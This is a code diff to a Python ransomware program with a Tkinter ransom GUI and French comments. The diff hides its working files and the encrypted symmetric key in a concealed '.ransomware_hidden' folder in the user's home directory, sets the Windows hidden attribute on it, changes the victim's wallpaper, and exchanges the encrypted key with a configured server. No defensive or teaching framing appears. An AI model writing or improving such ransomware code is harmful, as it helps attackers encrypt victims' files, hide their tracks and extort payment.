@@ -6,6 +6,7 @@ from threading import Thread
 import random
 import sys
 import os
+import shutil
 # Ajouter le répertoire parent au chemin de recherche des modules
 parent_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
 sys.path.append(parent_dir)
@@ -16,12 +17,24 @@ import socket
 import threading
 import configparser
 
+# Chemin du dossier caché dans le répertoire de l'utilisateur
+hidden_dir = os.path.join(os.path.expanduser("~"), ".ransomware_hidden")
+if not os.path.exists(hidden_dir):
+    os.makedirs(hidden_dir)
+
+    # Définir l'attribut caché sous Windows
+    if os.name == 'nt':  # Vérifie si le système d'exploitation est Windows
+        FILE_ATTRIBUTE_HIDDEN = 0x02
+        ret = ctypes.windll.kernel32.SetFileAttributesW(hidden_dir, FILE_ATTRIBUTE_HIDDEN)
+        if not ret:
+            raise ctypes.WinError()
 class RansomwareGUI:
-    TIMER_FILE = "timer_data.txt"
-    LOG_FILE = "interaction_log.txt"
-    NEW_WALLPAPER = "wallpaper\wallpaper.png"
-    OLD_WALLPAPER = "old_wallpaper.txt"
-    ENCRYPTION_FLAG = "encryption_done.flag"
+
+    TIMER_FILE =  os.path.join(hidden_dir, "timer_data.txt")
+    LOG_FILE =  os.path.join(hidden_dir, "interaction_log.txt")
+    NEW_WALLPAPER =  os.path.join("wallpaper", "wallpaper.png")
+    ENCRYPTION_FLAG =  os.path.join(hidden_dir, "encryption_done.flag")
+    KEY_FILE = os.path.join(hidden_dir, "keys", "encrypted_symmetric_key.bin")
 
     def __init__(self, root):
         self.root = root
@@ -38,9 +51,9 @@ class RansomwareGUI:
         self.server_port = self.config['SERVER']['client_port']
 
         script_dir = os.path.dirname(os.path.abspath(__file__))
-        self.save_old_wallpaper()
         wallpaper_path = os.path.join(script_dir, self.NEW_WALLPAPER)
         self.set_wallpaper(wallpaper_path)
+        os.remove(wallpaper_path)
 
         self.setup_ui()
         self.start_timer()
@@ -51,14 +64,6 @@ class RansomwareGUI:
         config.read(config_path)
         return config
 
-    def save_old_wallpaper(self):
-        SPI_GETDESKWALLPAPER = 0x0073
-        buffer_size = 260
-        buffer = ctypes.create_unicode_buffer(buffer_size)
-        ctypes.windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, buffer_size, buffer, 0)
-        with open(self.OLD_WALLPAPER, 'w') as file:
-            file.write(buffer.value)
-
     def set_wallpaper(self, image_path):
         if os.path.exists(image_path):
             SPI_SETDESKWALLPAPER = 20
@@ -68,7 +73,6 @@ class RansomwareGUI:
         # Chemin vers le fond d'écran par défaut de Windows
         default_wallpaper_path = r"C:\Windows\Web\Wallpaper\Windows\img0.jpg"
         self.set_wallpaper(default_wallpaper_path)
-
 
     def load_timer(self):
         if os.path.exists(self.TIMER_FILE):
@@ -122,8 +126,7 @@ class RansomwareGUI:
                 messagebox.showerror("Erreur", "Serveur non trouvé.")
                 return
 
-            encrypted_symmetric_key_path = os.path.join('keys', 'encrypted_symmetric_key.bin')
-            with open(encrypted_symmetric_key_path, 'rb') as key_file:
+            with open(self.KEY_FILE, 'rb') as key_file:
                 encrypted_symmetric_key = key_file.read()
 
             response = requests.post(
@@ -150,14 +153,8 @@ class RansomwareGUI:
         self.log_interaction("Fichiers déchiffrés avec succès")
         self.set_default_wallpaper()
         self.root.destroy()
-        if os.path.exists(self.TIMER_FILE):
-            os.remove(self.TIMER_FILE)
-        if os.path.exists(self.LOG_FILE):
-            os.remove(self.LOG_FILE)
-        if os.path.exists(self.OLD_WALLPAPER):
-            os.remove(self.OLD_WALLPAPER)
-        if os.path.exists(self.ENCRYPTION_FLAG):
-            os.remove(self.ENCRYPTION_FLAG)
+        if os.path.exists(hidden_dir):
+            shutil.rmtree(hidden_dir)
 
     def setup_ui(self):
         message = (
